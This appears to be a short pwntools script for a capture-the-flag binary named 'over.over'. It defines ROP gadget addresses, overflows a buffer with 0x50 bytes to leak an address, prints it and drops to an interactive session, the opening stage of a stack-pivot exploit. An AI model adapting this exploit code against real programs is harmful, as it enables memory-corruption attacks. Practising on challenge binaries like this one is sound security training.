from pwn import *

io = process("./over.over")
elf = ELF("./over.over")
libc = elf.libc
bss = elf.bss()

leave_ret = 0x4006BE
pop_rdi = 0x400793
pop_rdx_rsi = 0x1151C9

payload = 'A'*0x50
io.send(payload)
io.recv(80)
d = io.recvuntil('\n' ,drop=True)
print hex(u64(d.ljust(8, '\x00')))
io.interactive()

